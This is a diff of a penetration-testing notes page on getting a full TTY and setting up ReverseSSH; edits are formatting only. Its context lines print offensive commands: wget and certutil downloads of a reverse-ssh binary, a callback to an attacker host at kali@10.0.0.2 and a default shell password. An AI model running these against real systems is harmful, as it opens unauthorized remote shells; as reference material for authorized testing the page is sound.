@@ -2,8 +2,7 @@
 
 ## Full TTY
 
-Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found the /etc/shells file
-This incident has been reported`. Also note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
+Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found the /etc/shells file This incident has been reported`. Also note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -53,7 +52,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 /dev/shm/reverse-ssh -v -l :4444
 ```
 
-2. (a) Linux target:
+* \(2a\) Linux target:
 
 ```bash
 # Drop it via your preferred way, e.g.
@@ -62,16 +61,16 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 /dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
 ```
 
-2. (b) Windows 10 target (for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)):
+* \(2b\) Windows 10 target \(for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)\):
 
-```powershell
+```bash
 # Drop it via your preferred way, e.g.
 certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 
-3. If the ReverseSSH port forwarding request was successful, you should now be able to log in with default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:
+* If the ReverseSSH port forwarding request was successful, you should now be able to log in with default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:
 
 ```bash
 # Interactive shell access
